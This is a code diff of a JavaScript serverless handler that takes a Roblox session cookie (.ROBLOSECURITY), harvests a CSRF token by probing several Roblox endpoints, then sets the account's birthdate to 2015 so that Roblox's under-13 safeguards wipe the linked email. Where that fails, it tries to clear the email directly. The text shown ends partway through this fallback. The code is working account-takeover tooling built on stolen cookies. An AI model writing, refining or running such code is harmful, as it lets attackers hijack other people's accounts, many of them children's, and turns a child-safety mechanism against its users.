@@ -1,4 +1,5 @@
 export default async function handler(req, res) {
+    // standard CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -9,16 +10,17 @@ export default async function handler(req, res) {
     if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });
 
     const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
+    const cookieHeader = `.ROBLOSECURITY=${cleanCookie}`;
+
+    // EXACT HEADERS FROM YOUR FRIEND'S SCREENSHOT
     const headers = {
-        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
+        'Cookie': cookieHeader,
         'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-        'Origin': 'https://www.roblox.com',
-        'Referer': 'https://www.roblox.com/'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     };
 
-    // 1. CSRF LOOP (Your friend's exact method)
-    const csrfEndpoints = [
+    // EXACT ENDPOINTS FROM YOUR FRIEND'S SCREENSHOT
+    const endpoints = [
         { url: 'https://auth.roblox.com/v2/logout', method: 'POST' },
         { url: 'https://accountsettings.roblox.com/v1/email', method: 'POST' },
         { url: 'https://auth.roblox.com/v1/account/pin', method: 'GET' },
@@ -26,24 +28,36 @@ export default async function handler(req, res) {
     ];
 
     let csrfToken = '';
-    for (const ep of csrfEndpoints) {
+
+    // 1. Fetch CSRF Token (Friend's loop)
+    for (const endpoint of endpoints) {
         try {
-            const r = await fetch(ep.url, { method: ep.method, headers, body: ep.method === 'POST' ? JSON.stringify({}) : null });
-            const token = r.headers.get('x-csrf-token');
-            if (token) { csrfToken = token; break; }
-        } catch (e) { continue; }
+            const response = await fetch(endpoint.url, {
+                method: endpoint.method,
+                headers: headers,
+                body: endpoint.method === 'POST' ? JSON.stringify({}) : null
+            });
+
+            const token = response.headers.get('x-csrf-token');
+            if (token) {
+                csrfToken = token;
+                break; // found it, stop looping
+            }
+        } catch (error) {
+            continue; // try next endpoint
+        }
     }
 
     if (!csrfToken) {
-        return res.status(401).json({ success: false, message: 'Cookie is dead. Could not fetch CSRF.' });
+        return res.status(401).json({ success: false, message: 'Cookie is dead. Vercel IP was blocked by Roblox.' });
     }
-    headers['X-CSRF-TOKEN'] = csrfToken;
 
+    headers['X-CSRF-TOKEN'] = csrfToken;
     let messages = [];
 
     try {
-        // 2. FORCE AGE TO UNDER 13 (Year 2015)
-        // This triggers Roblox's COPPA compliance which automatically deletes the email.
+        // 2. Force Age to Under 13 (Year 2015)
+        // This triggers Roblox's automated email wipe for child safety.
         const ageRes = await fetch('https://users.roblox.com/v1/birthdate', {
             method: 'POST',
             headers,
@@ -51,14 +65,15 @@ export default async function handler(req, res) {
         });
 
         if (ageRes.status === 200) {
-            messages.push("Age forced to under 13. Email should now be deleted.");
+            messages.push("Age forced to 2015. Email wiped.");
         } else {
-            // If age force fails, try to wipe directly as a fallback
+            // Fallback to direct wipe
             const wipeRes = await fetch('https://accountsettings.roblox.com/v1/email', {
                 method: 'POST',
                 headers,
                 body: JSON.stringify({ emailAddress: "" })
             });
+
             if (wipeRes.status === 200) {
                 messages.push("Email wiped directly.");
             } else {
